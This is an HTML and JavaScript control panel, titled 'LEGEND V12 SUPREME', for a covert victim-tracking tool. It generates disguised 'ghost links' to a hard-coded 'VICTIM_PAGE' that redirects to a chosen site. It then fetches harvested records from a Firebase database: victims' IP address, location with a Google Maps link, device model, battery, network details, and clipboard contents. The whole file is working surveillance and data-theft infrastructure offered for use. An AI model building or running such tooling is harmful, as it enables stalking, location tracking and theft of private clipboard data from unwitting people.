<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MA LEGEND | V12 DASHBOARD</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@700&display=swap');
        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; padding: 20px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 900px; }
        .card { background: #e0e5ec; padding: 30px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 30px; text-align: center; }
        h1 { font-family: 'Orbitron'; color: #00a884; font-size: 1.5rem; }
        input { width: 80%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 5px 5px 10px #bcbfc5, inset -5px -5px 10px #ffffff; outline: none; margin: 10px 0; color: #44476a; }
        .btn { padding: 15px 30px; border: none; border-radius: 15px; background: #00a884; color: white; font-weight: bold; cursor: pointer; box-shadow: 5px 5px 10px #bcbfc5; transition: 0.3s; margin: 5px; }
        .btn:active { box-shadow: inset 3px 3px 5px #007d62; }
        .log-card { background: #e0e5ec; padding: 20px; border-radius: 20px; box-shadow: 7px 7px 14px #bcbfc5, -7px -7px 14px #ffffff; margin-top: 20px; text-align: left; border-left: 8px solid #00a884; }
        .badge { background: #d1d9e6; padding: 5px 10px; border-radius: 8px; display: inline-block; margin: 3px; font-size: 0.8rem; font-weight: 600; color: #00a884; }
        pre { background: #222; color: #00ffaa; padding: 15px; border-radius: 10px; white-space: pre-wrap; font-size: 0.8rem; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>LEGEND V12 SUPREME</h1>
            <input type="text" id="masterKey" placeholder="Your Secret Key">
            <input type="text" id="targetUrl" placeholder="Target URL (e.g. https://youtube.com)">
            <br>
            <button class="btn" onclick="generateLink()">GENERATE GHOST LINK</button>
            <p id="resLink" style="color:#00a884; font-weight:bold; margin-top:15px; word-break: break-all;"></p>
        </div>

        <div style="text-align: center;">
            <button class="btn" onclick="fetchLogs('tracking')">FETCH DEVICE DATA</button>
            <button class="btn" onclick="fetchLogs('clipboard')">FETCH CLIPBOARD</button>
        </div>

        <div id="displayArea"></div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; // Check your Vercel link here

        async function generateLink() {
            const key = document.getElementById('masterKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim();
            if(!key || !url) return alert("Pehle details bhariye!");
            const payload = btoa(JSON.stringify({ k: key, r: url }));
            document.getElementById('resLink').innerText = `${VICTIM_PAGE}?id=${payload}`;
        }

        async function fetchLogs(path) {
            const key = document.getElementById('masterKey').value.trim();
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            const area = document.getElementById('displayArea');
            area.innerHTML = "";
            if(!data) return area.innerHTML = "<p style='text-align:center;'>No data found.</p>";

            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                if(path === 'tracking') {
                    area.innerHTML += `
                    <div class="log-card">
                        <b>üïí ${item.time}</b><br>
                        <span class="badge">üåê IP: ${item.ip}</span> <span class="badge">üìç ${item.loc}</span><br>
                        <span class="badge">üïí TZ: ${item.tz}</span> <span class="badge">üì± ${item.model}</span><br>
                        <span class="badge">üîã Bat: ${item.bat} (Chg: ${item.chg})</span> <span class="badge">üß† RAM: ${item.ram}</span><br>
                        <span class="badge">üì∂ ${item.net} (${item.speed})</span> <span class="badge">üñ•Ô∏è ${item.res}</span><br>
                        <a href="${item.map}" target="_blank" style="color:#00a884; font-weight:600;">[ VIEW ON GOOGLE MAPS ]</a>
                    </div>`;
                } else {
                    area.innerHTML += `<div class="log-card"><b>üïí ${item.time}</b><pre>${item.clipData}</pre></div>`;
                }
            });
        }
    </script>
</body>
</html>
